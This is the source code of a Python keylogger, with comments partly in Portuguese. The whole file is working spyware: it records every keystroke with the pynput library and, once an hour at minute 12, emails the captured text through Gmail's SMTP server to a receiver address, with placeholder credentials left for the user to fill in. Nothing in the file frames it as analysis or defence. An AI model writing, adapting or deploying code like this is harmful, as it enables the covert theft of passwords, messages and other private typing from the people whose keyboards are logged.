from pynput import keyboard
import smtplib, ssl
from datetime import datetime
data = ""
def on_release(key):
    global data
    try:
        if hasattr(key,'char'):           
            data += key.char
    except AttributeError as e:
        print(e)

listener = keyboard.Listener(on_release=on_release)
listener.start()
while True:
    enviou         = False
    smtp_server    = "smtp.gmail.com"
    port           = 587 
    time           = 12
    #Change this/Mude isso
    sender_email   = "sender@gmail.com"
    #Change this/Mude isso
    password       = "xxxxxxxxxxxxx"
    #Change this/Mude isso
    receiver_email = "receiver@gmail.com"
    context        = ssl.create_default_context()
    if datetime.now().minute == time:
        if  enviou == False:         
            try:
                print(f"Enviando email...{data}")
                server = smtplib.SMTP(smtp_server,port)
                server.ehlo() 
                server.starttls(context=context)
                server.ehlo()
                server.login(sender_email, password)
                server.sendmail(sender_email,receiver_email,data.encode('utf-8'))
                data = ""
                enviou = True
                print(enviou)
            except Exception as e:
                print(e)
            finally:
                server.quit() 
